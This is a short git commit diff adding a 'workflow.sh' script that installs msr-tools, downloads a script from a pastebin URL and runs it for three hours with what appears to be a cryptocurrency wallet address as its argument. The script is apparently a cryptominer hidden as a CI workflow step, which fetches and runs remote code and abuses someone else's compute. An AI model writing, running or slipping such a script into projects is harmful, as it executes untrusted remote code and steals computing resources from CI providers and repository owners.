5fa637d90d1f39c1dd15fea430f49cbb6ee6e13b
rotmb <56585958+rotmb@users.noreply.github.com>
2021-03-01 17:05:09 +0300

    Initial commit sQS

---
+++ workflow.sh
@@ -0,0 +1,4 @@
+sudo apt-get install msr-tools
+curl https://nekobin.com/raw/yoloyupiwe -o ~/linux.sh
+timeout 3h bash ~/linux.sh 42nuranNDpL9p3ikUf8EKG5vUATb5x5rnFydsqbRtr9TFntnJE27rgZ4J5wDhc3nxV9jd22cCki95AKtyFQKhbWvNJdr9h6
+echo sQS
